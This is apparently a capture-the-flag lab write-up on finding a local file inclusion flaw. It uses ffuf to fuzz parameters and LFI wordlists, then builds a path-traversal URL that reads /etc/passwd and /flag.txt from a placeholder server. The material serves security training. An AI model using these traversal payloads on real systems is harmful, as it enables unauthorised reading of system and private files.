# Automated Scanning

#### Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt

**Step 1** - Fuzz parameters:

* Use the [burp-parameter-names.txt](https://github.com/kafkaesqu3/fuzzing/blob/master/parameters/burp-parameter-names.txt) wordlist with the following command:
  * {% code overflow="wrap" %}
    ```bash
    ffuf -w burp-parameter-names.txt:FUZZ -u 'http://SERVER_IP:SERVER_PORT/index.php?FUZZ' -fs 2309
    ```
    {% endcode %}

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

**Step 2** - Fuzz LFI payloads:

* Use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist:
  * {% code overflow="wrap" %}
    ```bash
    ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://SERVER_IP:SERVER_PORT/index.php?view=FUZZ' -fs 1935
    ```
    {% endcode %}

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

**Step 3** - Test one of the discovered payloads:

* Append the payload to the application URL:
  * {% code overflow="wrap" %}
    ```
    http://SERVER_IP:SERVER_PORT/index.php?view=../../../../../../../../../../../../../../../../../../../../../../etc/passwd
    ```
    {% endcode %}

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**Step 4** - Get the flag:

* Now simply substitute **/etc/passwd** for **/flag.txt**
  * `../../../../../../../../../../../../../../../../../../../../../../flag.txt`

<figure><img src="../../../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>

And flag found!
